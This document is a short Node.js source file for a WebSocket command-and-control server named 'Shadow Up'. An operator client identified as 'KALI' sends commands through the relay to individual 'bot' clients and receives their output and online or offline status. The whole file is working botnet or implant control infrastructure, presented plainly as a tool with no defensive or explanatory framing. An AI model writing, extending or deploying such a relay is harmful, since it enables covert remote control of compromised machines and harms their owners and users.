const WebSocket = require('ws');
const server = require('http').createServer((q, r) => r.end('Shadow Up'));
const wss = new WebSocket.Server({ server });

let KALI = null;
const BOTS = new Map();

wss.on('connection', (ws, req) => {
    const id = new URLSearchParams(req.url.split('?')[1]).get('id');
    if (id === 'KALI') {
        KALI = ws;
        BOTS.forEach((_, bId) => KALI.send(JSON.stringify({t:'bot', s:'on', id:bId})));
    } else {
        if (BOTS.has(id)) BOTS.get(id).terminate();
        BOTS.set(id, ws);
        if (KALI) KALI.send(JSON.stringify({t:'bot', s:'on', id}));
    }

    ws.on('message', m => {
        if (ws === KALI) {
            const d = JSON.parse(m);
            if (BOTS.has(d.to)) BOTS.get(d.to).send(d.cmd);
        } else if (KALI) {
            KALI.send(JSON.stringify({t:'res', f:id, d:m.toString()}));
        }
    });

    ws.on('close', () => {
        if (ws === KALI) KALI = null;
        else { BOTS.delete(id); if (KALI) KALI.send(JSON.stringify({t:'bot', s:'off', id})); }
    });
});
server.listen(process.env.PORT || 10000);
